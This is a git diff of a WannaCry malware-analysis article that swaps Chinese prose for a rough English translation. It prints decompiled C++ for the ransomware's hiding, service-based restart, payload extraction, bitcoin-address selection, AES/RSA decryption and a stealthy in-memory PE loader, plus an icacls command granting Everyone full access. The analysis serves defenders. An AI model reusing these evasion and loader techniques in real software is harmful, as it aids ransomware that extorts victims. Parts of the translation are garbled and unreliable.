@@ -4,11 +4,11 @@ The WannaCry ransomware attack is an ongoing worldwide cyberattack by the WannaC
 
 The attack started on Friday, 12 May 2017, and within a day was reported to have infected more than 230,000 computers in over 150 countries. Parts of Britain's National Health Service (NHS), Spain's Telefónica, FedEx and Deutsche Bahn were hit, along with many other countries and companies worldwide.
 
-作为一名安全行业工作者，我对WannaCry进行了深度的分析。 完整的分析可以帮助安全行业工作者了解黑客的的最新攻击手段，为防护领域的解决方案提供有价值的信息，更进一步尝试发现软件弱点，为客户提供有价值的数据恢复服务。
+As a security industry worker, I conducted a deep analysis of WannaCry. A complete analysis can help security industry workers understand hackers' latest attacks, provide valuable information for solutions in the field of protection, and try to find software vulnerabilities to provide valuable data recovery services to customers.
 
-下面我将开始对我这2天分析的结果做一个全面的回顾。
+Here I will start a comprehensive review of the results of my two days of analysis.
 
-我之前对CryptXXX，Cerber以及Locky这几种高热点勒索软件进行过深入分析，Wannacry这款勒索软件显然吸取了之前勒索软件的设计经验，并进化升级出了一个二阶段攻击方法。 什么是二阶段攻击呢？简单来讲，就是恶意程序本身并没有攻击行为，比如Wannacry程序自身并不做数据加密的工作，它会将真正具有攻击行为的代码动态释放出来，将数据加密的行为隐藏到释放出来的代码中。 这听起来类似壳的行为，比如Locky就是一款带壳的勒索软件，它运行起来后会通过壳代码释放恶意代码。 但壳代码本身也是一个很明显的特征，比如加过壳的代码无法进行反汇编，并且一般情况下信息熵很高，很多防护软件会对这种程序提高危险等级，用户一旦碰到，或者这种程序一旦Drop到用户的机器上就会被Detect到。 但是Wannacry不同，它的第一阶段程序完全没有任何壳代码，EntryPoint也没有做任何的定制，没有任何认为修改的痕迹，也许这也是Wannacry会在利用微软漏洞大规模被传播到Endpoint上没有被发现的原因吧。
+I had an in-depth analysis of CryptXXX, Cerber, and Locky's high-calorie ransomware, and Wannacry had learned the experience of extrapolating software before evolving and escalating a two-stage attack. What is a two-stage attack? In short, the malicious program itself does not attack behavior, such as Wannacry program itself does not do data encryption work, it will really have the code of the dynamic release that has encryption behavior hidden in the release of the code. It sounds like shell-like behavior, such as Locky is a shell with ransomware, it will run up through the shell code to release malicious code. But the shell code itself is also a very obvious feature, such as overweight code can not be disassembled, and under normal circumstances the information entropy is very high, many protection software will improve the risk level of this program, the user once encountered, or this Once the program drops to the user's machine will be detected to. But Wannacry is different, its first-stage program does not have any shell code at all, EntryPoint does not do any customization, there is no trace of any thought that change, maybe this is also Wannacry will be used in large-scale use of Microsoft vulnerabilities to be transmitted on Endpoint.
 
 About other Ransomware in-depth analysis please refer to my blog:
 [http://www.tedzhang.online/wordpress/index.php/2016/08/07/ransomware-locky-analysis/](http://www.tedzhang.online/wordpress/index.php/2016/08/07/ransomware-locky-analysis/)
@@ -17,26 +17,25 @@ About other Ransomware in-depth analysis please refer to my blog:
 
 **Hack Weapon**
 
-在开始分析之前，想先讲一下Hack Weapon这个概念，根据很多专业机构的分析，这条黑色产业链已经发展的非常成熟了。 在暗网，你可以买到各种各样的攻击组件，组成一个有效的攻击实体；例如，有漏洞，有加载器，有加密模块等，那么我可以根据我的需要去买合适的模块，然后在进行组装成一个真正具有攻击性的恶意程序。其中这些模块就是Hack Weapon，我们收集到的很多Sample都是很多模块的组合，那我们通过in-depth的逆向分析后发现了一款恶意软件中存在有多种攻击武器的时候能否将这些攻击武器提取出来，单独建立一个Hack Weapon并对这些Hack Weapon进行特征建模，行为建模来完善我们的安全产品呢？
+Before starting the analysis, would like to talk about the concept of Hack Weapon, according to the analysis of many professional bodies, this black industry chain has been developed very mature. In the deep network, you can buy a variety of attack components to form a valid attack entity; for example, there are zeroday holes, there are loaders, encryption module, then I can according to my needs to buy the right module, And then assembled into a truly malicious program. Which is the module Hack Weapon, we collected a lot of Sample is a combination of many modules, then we through the in-depth analysis of the in-depth found a malicious software, there are a variety of attack weapons when these attacks can be Weapon Extraction, The establishment of a separate arsenal and these Hack Weapon feature modeling, behavior modeling to improve our security products? 
 
-从技术的角度来说，Machine Instruction级别的复用是绝对一致性的，并不像源代码级别的复用会因为编译器选项的不通导致最终Machine Instruction发生细微变化。
+From a technical point of view, the multiplexing of the Machine Instruction level is absolutely consistent, because there is no recompile, so there will be no inconsistency due to the compiler version or option.
 
-黑客武器的提供者，应该不会提供源代码，而是将武器作为binary提供给下游黑客，所以建立这种武器库，提供了很强的特征性。 而从武器的角度去匹配恶意程序具有更准确的鉴别能力，比如说我认为一款隐蔽的Peloader模块属于恶意软件的一种，那么针对这种Weapon进行特征或行为建模将更能针对使用了这款Weapon的所有恶意软件，会是的安全防护软件具有打击多点的能力。
+Hacker weapons providers, should not provide the source code, but the weapons as a binary provided to the downstream hackers, so the establishment of this arsenal, providing a very strong character. And from the perspective of weapons to match malicious programs with more accurate ability to identify, for example, I think a hidden Peloader module is a kind of malware, then for this Weapon character or behavior modeling will be more targeted for the use of This Weapon all the malware, will be the security protection software has the ability to combat more.
 
-我曾经抽取过一款针对程序中String进行加密，并在始终之前进行解密的Hack Weapon，当时我并没有想到恶意软件会有模块化这种设计，直到在另外一款恶意软件中见到同样的行为，并且进行抽取发现整个function的flow甚至Instruction都完全一致。
+I have extracted a Hack Weapon for the process of String encryption, then I did not think the software will have a modular design, until another malicious software to see the same Behavior, and the extraction of the entire function of the flow even Instruction are completely consistent.
 
-这次在分析的过程中，我至少已经可以识别出两种Hack Weapon: PeLoader 和 Resource Extractor，前者用于加载一个PE file到内存中，并且在不调用微软API（不准确，极少调用，因为分配内存还需要调用VirtualAlloc）的情况下解决Import Table，Base Relocation等超麻烦的事项，以至于使用Monitor等程序都发现不了他有一个LoadDll的行为；后者用于从Resource中提取一个加密过的攻击用的PE payload，这两个模块都非常的精巧。 我想就算是作者也没有重新写一遍的念头，这需要进行大量细心的编码和大量的测试，因为稍微一些疏忽就会导致最后的攻击功亏一篑（指的是加载Payload失败）。
+This time in the analysis process, I have at least been able to identify two kinds of Hack Weapon: PeLoader and Resource Extractor, the former used to load a PE file into memory, and do not call the Microsoft API (not accurate, very few calls, because The allocation of memory also need to call VirtualAlloc) circumstances to solve the Import Table, Base Relocation and other super troublesome things, so that the use of Monitor and other procedures are not found he has a LoadDll behavior; the latter used to extract from the Resource an encrypted Attack with the PE payload, the two modules are very sophisticated. I think that even if the author does not re-write the idea, which requires a lot of careful coding and a lot of testing, because a little negligence will lead to the final attack fall short (referring to the load Payload failure).
 
-在这次分析结束后，我会将这两个Hack Weapon抽取出来，并写一个POC代码，复用这两个组件。
+At the end of this analysis, I will extract the two Hack Weapon and write a POC code to reuse the two components.
 
-## first phase ##
+## phase one ##
 
 **tasksche** 
 
-Wannacry的主程序会被修改会**tasksche.exe**，起这个名字的目的是为了迷惑用户。 下面我们来一起来分析一下这个程序，从WinMain函数开始。
+Wannacry's main program will be changed to **tasksche.exe**, from the name of the purpose is to confuse the user. Here we come together to analyze this procedure, starting from the WinMain function.
 
-
-> 为了容易说明程序的行为，以下的代码片段将全部使用C++语言来表述，除非碰到C++表达混乱或者因编译器优化等原因导致C++无法表达的情况下，会采用汇编语言并加详细说明。
+> In order to easily explain the behavior of the program, the following code snippet will be used to express all the C + + language, unless the encounter C ++ expression confusion or compiler optimization and other reasons C + + can not express the case, will use assembly language and a detailed description.
 
 ```C++
 int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
@@ -94,9 +93,9 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 }
 ```
 
-WinMain的代码很容易理解，声明了几个变量，其中CProgram对象，CPeBuilder指针，以及fpTaskStart是整个WinMain运行的关键，WinMain的目的是动态加载一个Pe dll到内存中并运行起来，整个过程做的相当的隐蔽。 WinMain函数在栈上声明了一个520 byte的数组，用来获取当前进程的完整路径，程序会利用这个路径将文件复制一份并命名为tasksche.exe，并调用StartMalware启动自己。
+WinMain code is easy to understand, declare a few variables, which CProgram object, CPeBuilder pointer, and fpTaskStart WinMain is the key to the operation, WinMain is the purpose of dynamically loading a Pe dll to memory and run up, the whole process to do quite The concealment. The WinMain function declares a 520 byte array on the stack to get the full path to the current process. The program will use this path to copy the file and name it tasks.exe and call StartMalware to start itself.
 
-在这里Malware已经通过漏洞进入Endpoint中并且被launch起来了，我认为这里存在一个common的阶段，我把这个阶段定义为**隐藏阶段**。何为隐藏阶段，换句话说在这个阶段Malware首先要做的不是执行攻击代码，而是在实施攻击之前首先隐匿自己的行踪，伪装自己为一个看起来正常的程序，并在日后的日志调查中迷惑分析人员。
+Here Malware has been through the zeroday holes into the Endpoint and was launched, I think there is a common phase, I define this stage as **hidden stage**. What is the hidden stage, in other words Malware at this stage is not the first to do the implementation of the attack code, but in the implementation of the attack before the first to hide their whereabouts, camouflage himself as a seemingly normal procedure, and in the future log investigation Confuse the analyst.
 
 ```C++
 if ( *_p___argc() != 2
@@ -106,16 +105,16 @@ if ( *_p___argc() != 2
 || !StartMalware() )
 ```
 
-仔细看一下这段代码，Wannacry启动后的第一时间进行了几个关键操作：
+Take a closer look at this code, Wannacry started the first time after a few key operations:
 
-- 检查启动参数
-- 创建隐藏数据(folder)
-- 重命名为tasksche.exe
-- 再次启动自己
+- Check the startup parameters
+- create hidden data (folder)
+- Rename to tasksche.exe
+- Start yourself again
 
-检查启动参数与重命名可以直接从表达式中判断出来，不复杂。
+Check the start parameters and rename can be directly from the expression to judge out, not complicated.
 
-**创建隐藏数据**
+**create hidden data (folder)**
 
 ```C++
 int __cdecl CreateHiddenData(wchar_t *p)
@@ -155,7 +154,7 @@ int __cdecl CreateHiddenData(wchar_t *p)
 }
 ```
 
-上面的函数最终创建了**%WinDir%\ProgramData，%WinDir%\Intel**两个folder并将其属性设置为Hidden。
+The above function eventually created **%WinDir%\ProgramData,%WinDir%\Intel** two folders and set their properties to Hidden.
 
 ```C++
 int __cdecl CreateFolder(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *String)
@@ -181,9 +180,9 @@ int __cdecl CreateFolder(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *String
 }
 ```
 
-上面是CreateFolder的代码，很容易理解，主要是对通过此函数创建的Folder设置Hidden属性。
+The above is the CreateFolder code, it is easy to understand, mainly through the creation of this function Folder set Hidden property.
 
-**再次启动自己**
+**Restart Again**
 
 ```C++
 BOOL StartMalware()
@@ -199,11 +198,11 @@ BOOL StartMalware()
 }
 ```
 
-注意最后一行的代码，Wannacry会用2中种方式再次启动自己，首先尝试将自己伪装成服务程序，如果失败了，在尝试通用的进程方式。
+Note that the last line of code, Wannacry will use two kinds of ways to start their own, first try to disguise themselves as a service program, if the failure, try the general process of the way.
 
-*服务方式*
+*service method*
 
-在利用服务方式启动的时候，Wannacry首先会利用在WinMain中初始化的一个随机序列作为服务名称。 下面是生成随机序列的代码：
+When starting with a service, Wannacry first takes advantage of a random sequence that is initialized in WinMain as the service name. Here is the code that generates the random sequence:
 
 ```C++
 int __cdecl CreateRandomSequence(char *displayname)
@@ -256,7 +255,7 @@ int __cdecl CreateRandomSequence(char *displayname)
 }
 ```
 
-这段代码利用了用户的计算机名称，通过对计算机名称的每一个自己进行乘法溢出运算，会得到一个初始化随机发生器的种子值，并利用随机数发生器来生成随机的服务名称。 这个随机的服务名称由'a-z''0-9'组成。
+This code takes advantage of the user's computer name. By multiplying each of the computer names by itself, a seed value of the initializer is initialized and a random number generator is used to generate a random service name. This random service name consists of 'a-z''0-9'.
 
 ```C++
 signed int __cdecl StartService(char *pFullpath)
@@ -314,7 +313,7 @@ signed int __cdecl StartService(char *pFullpath)
 }
 ```
 
-Wannacry利用StartService函数将自身作为一个带有随机服务名称的服务进行启动，这是最容易掩人耳目的隐蔽手段。 但是如果没有权限操作服务管理器，或者意外失败了，Wannacry还有常规启动方法作为备选。
+Wannacry uses the StartService function to start itself as a service with a random service name, which is the easiest way to conceal it. But if there is no permission to operate the service manager, or accidentally failed, Wannacry also has a regular startup method as an alternative.
 
 ```C++
 int __cdecl StartProcess(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
@@ -352,7 +351,8 @@ int __cdecl StartProcess(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpEx
 }
 ```
 
-StartProcess函数作为备选使用常规方式启动一个进程，这里被传入的CommandLine就是已经被改过名称为tasksche.exe的程序路径了，至少用这个名称这也有一些迷惑作用,并且一个小细节，设置了非窗口模式。
+StartProcess function as an alternative to use a regular way to start a process, where the incoming CommandLine is already changed the name of the program for the taskche.exe path, at least with the name of this also has some confusion, and a small detail, set the non Window mode.
+
 
 ```C++
 signed int __cdecl WaitMutex4Times(int param)
@@ -388,9 +388,9 @@ END:
 }
 ```
 
-无论使用哪种方式再次启动了自己，程序都会调用上面的函数去等待**Global\MsWinZonesCacheCounterMutexA0**这个系统Mutex，并且在接下来尝试等待60次，每次1秒，共计60秒。 这么看来这个Named的Mutex对象应该在真正发起共计的模块中，这是常规的假设。
+Whichever way you start yourself again, the program calls the above function to wait **Global \ MsWinZonesCacheCounterMutexA0** This system Mutex, and then try to wait 60 times, each time for 1 second, for a total of 60 seconds. It seems that the Named Mutex object should be in the attack module, which is a conventional assumption.
 
-当然如果上面的方法都失败了，Wannacry也不会放弃这唯一的一次机会加密用户的数据，既然隐藏不成，那就直接干吧。 而直接干这部分代码与隐藏后再来干的代码是一样的，正好合并分析。 在开始之前还有一些事情要做：
+Of course, if the above methods have failed, Wannacry will not give up this only one chance to encrypt the user's data, since hidden not, then do it directly. And directly dry this part of the code and hidden after the code is the same, just merge analysis. Before you start there are some things to do:
 
 ```C++
 WriteRegistry(1);
@@ -401,16 +401,16 @@ StartProcess(aIcacls_GrantEv, 0, 0);		// icacls . /grant Everyone:F /T /C /Q
 if ( InitKernel32Funcs() )
 ```
 
-- 写注册表
-- 提取Payload
-- 将Bitcoin钱包地址写入c.wnry
-- 将当前工作目录隐藏
-- 将当前目录授权所有人完全访问权限
-- 初始化系统调用
+- Write the registry
+- Extract Payload
+- Write Bitcoin wallet address to c.wnry
+- hide the current working directory
+- Full access to the current directory authorizations owner
+- Initialize system calls
 
-这里面隐藏工作目录，提权，以及初始化系统调用都没有什么好说的，剩下的几个操作中，最难的是ExtractFromResource，它从资源段中释放Payload。
+This is hidden inside the working directory, mention, and initialize the system call are nothing to say, the remaining few operations, the most difficult is ExtractFromResource, which release Payload from the resource segment. 
 
-**写注册表**
+**Write the registry**
 
 ```C++
 signed int __cdecl WriteRegistry(int flag)
@@ -467,20 +467,20 @@ signed int __cdecl WriteRegistry(int flag)
 }
 ```
 
-Wannacry利用WriteRegistryFunc将在"HKLM\Software\WanaCrypt0r"以及"HKCU\Software\WanaCrypt0r"下面创建一个wd的键并写入当前的工作目录，我们先假设它这么做是为了防止把自己也加密了吧。
+Wannacry uses WriteRegistryFunc to create a "wd" key under "HKLM\Software\WanaCrypt0r" and "HKCU\Software\WanaCrypt0r" and write it to the current working directory. Let's assume that it is done to prevent it from encrypting itself.
 
     WINDBG>du 0012f71c
     0012f71c  "Software\WanaCrypt0r"
 
 ![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/picture/WriteRegistry.png)
 
-**提取Payload**
+**Extract Payload**
 
-之前提到的程序逻辑都很简单，从这里开始往后就开始有意思了，分析这些代码还是很难的，同时也非常有意思。 首先来看看 Payload Extractor的实现。
+The logic of the procedure mentioned earlier is very simple, starting from here began to interesting, and analyze the code is still very difficult, but also very interesting. First look at the implementation of Payload Extractor.
 
-Wannacry在自己的res segment中存放了很多加密过的Data，这里面有很多有恶意的程序，要想了解它们都是做什么的，我们需要先了解它的内存布局。
+Wannacry in their own res segment stored in a lot of encrypted Data, there are a lot of malicious programs, in order to understand what they are doing, we need to understand its memory layout.
 
-提取函数首先将资源数据加载到内存中：
+The extraction function first loads the resource data into memory:
 
 ```C++
 hRes = FindResourceA(hModule, (LPCSTR)'\b\n', aXIA);
@@ -492,7 +492,7 @@ if ( hRes
 
 ![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/picture/ResourcePayload.png)
 
-之后调用StartVersion函数初始化一个CResource对象，这个对象会将load出来的Resource数据加载进去，之所以用这个函数名称，是以为它还有其它版本的加载方法，其中一个版本是通过一个文件句柄来加载Payload，也就是说这个Payload Extractor同时也支持从文件中提取Payload。
+After the call StartVersion function to initialize a CResource object, the object will load out of the Resource data loaded into the reason why the use of this function name, it has other versions of the loading method, one version is through a file handle to load Payload , Which means that the Payload Extractor also supports extracting Payload from the file.
 
 ```C++
 struct CResource
@@ -507,7 +507,7 @@ struct CResource
 };
 ```
 
-CResource如上面结构所示，有一些数据至今我还不清楚是做什么用的，但是最重要的数据结构是一个名为CWnBigResData的数据结构，这个数据结构的前0x20是CWnResData它包含了Payload的一些重要信息。 另外pSignture是这个对象的一个特征在这里是外面传入的数据“**WNcry@20l7**”。
+CResource As shown in the above structure, there are some data so far I do not know what to do, but the most important data structure is a data structure called CWnBigResData, the data structure of the former 0x20 is CWnResData it contains some of Payload Important information. In addition pSignture is a feature of this object here is the incoming data "**WNcry @ 20l7**".
 
 
 ```C++
@@ -542,7 +542,7 @@ CWnResult *__cdecl StartVersion3(HANDLE hRes, int nSize, int version, char *WNcr
 }
 ```
 
-StartVersion3是被StartVersion调用的，并且传入了3给version这个参数，因为这个参数的作用，程序会从Memory中读取Payload而不是文件句柄。 这个函数创建了CResource对象并调用了它的Initialize方法进行初始化。 初始化Payload的结果会记录在全局变量g_StatusCode中，如果初始化失败，会析构并退出，同时程序将无法成功。如果成功会创建一个CResult对象，这个对象有两个数据成员，bLoadSuccess用来表示初始化成功，pResource指针指向CResource对象。
+StartVersion3 is called by StartVersion, and passed 3 to the version of this parameter, because the role of this parameter, the program will read from the Memory Payload rather than the file handle. This function creates the CResource object and calls its Initialize method to initialize it. The result of initializing Payload is recorded in the global variable g_StatusCode. If the initialization fails, it will be destructed and exited, and the program will not succeed. If the success will create a CResult object, the object has two data members, bLoadSuccess used to indicate the success of the initialization, pResource pointer to the CResource object.
 
 ```C++
 pWnResData->bIsFile = 0;
@@ -554,9 +554,9 @@ pWnResData->nCurrentOffsetPos = 0;
 pWnResData->nOffsetInBuffer = 0;
 ```
 
-上面的代码片段是当version参数等于3时候的行为，有两个重要的数据pWnResData->lpResourceData被赋值为指向资源段的指针，pWnResData->nResourceSize是资源段的大小值。
+The above code snippet is the behavior of the version parameter equal to 3, there are two important data pWnResData->lpResourceData is assigned to the pointer to the resource segment, pWnResData->nResourceSize is the size of the resource segment.
 
-最重要的一个函数，来自于GetDataFromResource,这个方法真正的从Resource中加载数据到内存数据结构中。
+The most important function, from GetDataFromResource, this method really loads data from the Resource into the memory data structure.
 
 ```C++
 struct CWnResData
@@ -575,12 +575,12 @@ struct CWnResData
 };
 ```
 
-**这里的有趣的是，针对ResourceData的load是从后往前读的，这与常规的数据加载从Memory低往高读取的方式是反的，可以看出作者这么做真是用心良苦。**
+**The interesting thing here is that the load for ResourceData is read from behind, which is the way to read from the memory to the conventional low-to-high read, and it is true that the author is doing it well.**
 
 	34:961Fh: 50 4B 05 06 00 00 00 00 24 00 24 00 D8 0D 00 00  PK......$.$.Ø... 
 	34:962Fh: 47 88 34 00 00 00                                Gˆ4...
 
-上面的数据是我从Resource中提取出来的原始数据的最后22字节，通过对最后22个字节的分析，我将展示程序如何解释这种自定义协议的数据格式。
+The above data is the last 22 bytes of the raw data I extracted from the Resource. By analyzing the last 22 bytes, I will show how the program interprets the data format of this custom protocol.
 
 ```C++
 signed int __cdecl FindPkSignPosition(CWnResData *pResData)
@@ -655,19 +655,19 @@ LABEL_27:
 }
 ```
 
-FindPkSignPosition函数的作用是将pResourceBuffer指向最后一个PK0506的标记，上面的函数中有两个ResetCurrentOffset函数，两次调用中最后一个参数一次是2一次是0, 2代表指针当前位置是Buffer的末尾，0代表指针的值是一个绝为位置。所以第一调用时，将指针的位置移动了Buffer的末尾，第二次调用时指针已经指向了Buffer末尾，Offset的偏移等于一个Block的大小1028个自己。 所以这两次操作后，指针实际上等于从Buffer末尾往前偏移了1028字节，所以指针的当前位置等于Buffer总大小减去一个Block的大小。
+The FindPkSignPosition function is used to point the pResourceBuffer to the last token of the **PK0506**. There are two ResetCurrentOffset functions in the above function. first to call ResetCurrentOffset the last argument is 2, and second the last argument is 0. 2 indicates that the current position of the pointer is the end of the buffer, 0 indicates that the absolute position. So the first call, the pointer will move the location of the end of the Buffer, the second call when the pointer has been pointing to the end of Buffer, Offset's offset is equal to a block size of 1028 themselves. So after these two operations, the pointer is actually equal to 1028 bytes forward from the end of the Buffer, so the current position of the pointer is equal to the total size of the Buffer minus the size of a Block.
 
 	pBuffer = pBuffer + nTotalSize - nBlock
 
-定位完指针后，程序读取了一个Block大小的数据进了BlockBuffer中。
+After positioning the pointer, the program reads a block size of the data into the BlockBuffer.
 
 ```C++
 if ( pBuffer[index] == 'P' && pBuffer[index + 1] == 'K' && pBuffer[index + 2] == 5 && pBuffer[index + 3] == 6 )
 ```
 
-注意这个代码片段，程序开始从这个Block的最后一个字节反向搜索‘PK56’这个特殊的标记值。 它会一直读取直到读到我在上面贴出来的数据片段为止。
+Note that this code snippet, the program began to search from the last byte of the block 'PK56' this special tag value. It will always read until I read the data snippet posted above.
 
-观察上面的数据，程序会继续读取，将这些数据写入内存数据结构中，读取方法有2种，一次读取2个字节和一次读取4个字节。就我列出的数据，数据结构如下：
+Observe the above data, the program will continue to read, write these data into the memory data structure, there are two kinds of reading methods, read 2 bytes at a time and read 4 bytes at a time. For the data I have listed, the data structure is as follows:
 
 	Magic: 504B0506
 	Reserved1: 0
@@ -677,11 +677,11 @@ if ( pBuffer[index] == 'P' && pBuffer[index + 1] == 'K' && pBuffer[index + 2] ==
 	Current segment offset: 00000dd8
 	The absolute position of the previous segment: 00348847
 
-其中前一个段的绝对位置加上当前端的偏移等于当前段的绝对位置，如果尝试将这两个值相加，会发现等于我上面贴出的数据的当前位置，因此通过这个方法我们就可以不断的定位到前一个段，一直遍历到Memory的开头。
+Where the absolute position of the previous segment plus the offset at the front end is equal to the absolute position of the current segment. If you try to add the two values, you will find the current position of the data above equal to absolute position, so we can use this method. Constantly positioning to the previous section, has been traversed to the beginning of the Memory.
 
-因为Payload Extractor的代码非常多，它需要将所有段中的数据都提取出来，并且通过写文件的方法释放出来，所以就不在这里继续分析了，如果感兴趣，通过我上面的启发应该可以自己尝试的分析代码将所有的数据提取出来。
+Because Payload Extractor code is very much, it needs to extract all the data in the section, and by writing the file method to drop it, so do not continue to analyze here, if interested, through my inspiration should be able to try their own The analysis code extracts all the data.
 
-> PS. 我们在程序运行过程中看到过的 c.wnry u.wnry 等都是在这个阶段释放出来的。
+> PS. We have seen in the process of running c.wnry u.wnry and so are droped at this stage.
 
 <table>
     <tr>
@@ -727,9 +727,9 @@ if ( pBuffer[index] == 'P' && pBuffer[index + 1] == 'K' && pBuffer[index + 2] ==
 
 
 
-**写Bitcoin钱包地址**
+**Bitcoin Address**
 
-这个过程比较简单，首先有3个bitcoin的钱包地址，随机选择一个，写到buffer的第178字节开始的后35字节中，然后把buffer写到c.wnry中。
+This process is relatively simple, first there are three bitcoin wallet address, randomly selected one, write the first 178 bytes of the start of the first 35 bytes, and then write the buffer to c.wnry.
 
 ```C++
 int SetBitcoinAddress()
@@ -757,9 +757,10 @@ int SetBitcoinAddress()
 
 **PeLoader**
 
-到这里Payload也已经成功的提取出来了，那我们之前说过Wannacry是分两阶段攻击的，第一阶段还有一个最重要的任务就是将加密程序悄无声息的加载起来。 现在到了激动人心的时刻，通过接下来的分析，我们能够掌握PeLoader的运行原理。 作为第二阶段攻击的最重要的Weapon，Peloader将无视微软API，来完成Pe dll的动态加载。
+Here Payload has also been successfully extracted, and that we said before Wannacry is a two-stage attack, the first stage there is a most important task is to encrypt the program quietly loaded up. Now to the exciting moment, through the next analysis, we can grasp the operating principle of PeLoader. As the most important Weapon for the second-stage attack, Peloader will ignore the Microsoft API to complete the dynamic loading of Pe dll.
 
-如果不想翻到最上面看的话，这里有一个代码片段：
+If you do not want to turn to the top to see, then there is a code snippet:
+
 ```C++
 CProgram::ctor(&Program);
 if ( CProgram::Initialize(&Program, 0, 0, 0) )
@@ -780,7 +781,7 @@ if ( lpPEFile )
 CProgram::dtor_0(&Program);
 ```
 
-这里面有两个数据结构比较重要CProgram和CPeBuilder，先来看一下CProgram:
+There are two more data structures inside CProgram and CPeBuilder, first look at CProgram:
 
 ```C++
 class CProgram
@@ -807,7 +808,7 @@ struct CWnCryptContext
 };
 ```
 
-程序首先构造一个CProgram对象，并初始化内部的CWnCryptContext与CWnAES成员，其中微软的CWnCryptContext使用的CSP是“Microsoft Enhanced RSA and AES Cryptographic Provider”算法是RSA，RSA秘钥是从程序的数据段中读出来的。 
+The program first constructs a CProgram object and initializes the internal CWnCryptContext with the CWnAES member, where Microsoft's CWnCryptContext uses a CSP that is the "Microsoft Enhanced RSA and AES Cryptographic Provider" algorithm, that is RSA and the RSA secret key is read from the program's data segment The
 
 ```C++
 void *__thiscall CProgram::GetPeFile(CProgram *this, LPCSTR lpFileName, int *nRet)
@@ -890,9 +891,9 @@ void *__thiscall CProgram::GetPeFile(CProgram *this, LPCSTR lpFileName, int *nRe
 }
 ```
 
-上面的CProgram::GetPeFile函数利用程序数据段中的PublicKey对t.wnry中的一段数据进行解密，这段数据解密出来后是AES初始化向量，然后用它去初始化AES加密Key，之后继续读取将用这个AESKey加密的PE文件读取到内存中，并用初始化后的AESKey进行解密，这个函数返回一个在内存中的PE文件，接下来就轮到PeBuilder上场了。
+The above CProgram::GetPeFile function uses the PublicKey in the program data segment to decrypt a piece of data in t.wnry, which decrypts the AES initialization vector and then uses it to initialize the AES encryption key, the program continues reading With the AESKey encrypted PE file to read into memory, and with the initial AESKey to decrypt, this function returns a PE file in memory, then turn to PeBuilder play.
 
-通过这部分，我们可以了解一个被加密的文件的加密结构，通过后面没有提到的二阶段攻击分析，我发现即使是用户被加密的文件的加密后格式也与这个文件一致。
+Through this part, we can understand the encrypted structure of an encrypted file, through the above mention the two-stage attack analysis, I found that even the user is encrypted file encryption format is consistent with this file.
 
 <table>
     <tr>
@@ -934,7 +935,7 @@ void *__thiscall CProgram::GetPeFile(CProgram *this, LPCSTR lpFileName, int *nRe
 
 **PeBuilder**
 
-刚才Wannacry已经将在ResourceData中的t.wnry释放出来，并通过上面的解密动作成功在内存中放置了一个PE File，现在可以利用PeBuilder进行动态加载了。 PeBuilder非常的精巧，也很繁琐。
+Wannacry has just released in the ResourceData t.wnry out, and through the above decryption action successfully placed in memory a PE File, can now use PeBuilder for dynamic loading. PeBuilder is very sophisticated, and very cumbersome.
 
 ```C++
 CPeBuilder *__cdecl BuildPEExecutable(DOS_Header *fileBuffer, size_t nFileSize, LPVOID (__cdecl *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD, int), int (__cdecl *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType, int), HMODULE (__cdecl *LoadLibraryA)(LPCSTR lpLibFileName), int (__cdecl *GetProcAddress)(HMODULE, LPCSTR, DWORD), BOOL (__cdecl *FreeLibrary)(HMODULE hLibModule), int zero)
@@ -1077,7 +1078,7 @@ LABEL_37:
 }
 ```
 
-我相信即使是翻译成C++代码，看到上面的大篇幅代码也没有读下去的动力了，何况我看的是汇编级别的代码。 那我简单讲一下好了，这个函数会返回一个PeBuilder对象，它会解决加载这个pe对象的所有系统级别的工作。
+I believe that even if it is translated into C++ code, See the length of the code will feel very irritable, not to mention I see the assembly level code. Then I just talk about it, this function will return a PeBuilder object, it will solve all the system level of work while to load the pe object.
 
 ```C++
 !WncryBuildPESection(fileBuffer, nFileSize, pPEHead, pPeBuilder))
@@ -1085,9 +1086,9 @@ LABEL_37:
         !WncryFixImportTable(pPeBuilder) || !WncrySetPageProtect(pPeBuilder) || !WncryPerformTlsCallback(pPeBuilder)) )
 ```
 
-上面是一些重要的片段，如果你没有仔细读上面大片的代码，那么看看这个也是可以的。 
+Above is some important fragments, if you do not carefully read the above large code, please look this.
 
-这个PeBuilder厉害之处在于，只使用了以下5个系统API，因此即使利用Monitor工具也无法发现有一个Loaddll的动作在里面。
+The PeBuilder powerful thing is that only the use of the following five system API, so even with the Monitor tool can not find a Loaddll action inside.
 
 - VirtualAlloc
 - VirtualFree
@@ -1095,9 +1096,9 @@ LABEL_37:
 - GetProcAddress
 - FreeLibrary
 
-虽然有LoadLibrary在但是貌似没有使用。
+Although there are LoadLibrary but seemingly no use.
 
-CPeBuilder的数据结构如下：
+CPeBuilder data structure is as follows:
 
 ```C++
 struct CPeBuilder
@@ -1120,9 +1121,9 @@ struct CPeBuilder
 };
 ```
 
-其中ImageBase指向一块内存中的Buffer，它是一个被加载起来的Dll模块的基地址。
+Where ImageBase points to a buffer in memory, which is BaseAddress of a loaded Dll module.
 
-得到了CPeBuilder对象后，Wannacry利用Seek2TaskStart方法来定位到Dll中导出的TaskStart函数，并调用这个函数，真正开始第二阶段的攻击。
+After getting the CPeBuilder object, Wannacry uses the Seek2TaskStart method to locate the TaskStart function exported in the Dll and calls the function to actually start the second phase of the attack.
 
 ```C++
 int __cdecl Seek2TaskStart(CPeBuilder *pPeBuilder, char *szTaskStart)
@@ -1181,7 +1182,7 @@ LABEL_13:
 }
 ```
 
-上面这个函数接受CPeBuilder以及一个Func Name作为参数，程序在PE的Export中搜索名为FuncName的导出函数，并返回这个导出函数。
+The above function takes CPeBuilder and a Func Name as a parameter. The program searches for an export function named FuncName in the export of PE and returns the export function.
 
 ```C++
 while ( stricmp(szTaskStart, ImageBase + *AddressOfNames) )
@@ -1194,7 +1195,7 @@ while ( stricmp(szTaskStart, ImageBase + *AddressOfNames) )
   }
 ```
 
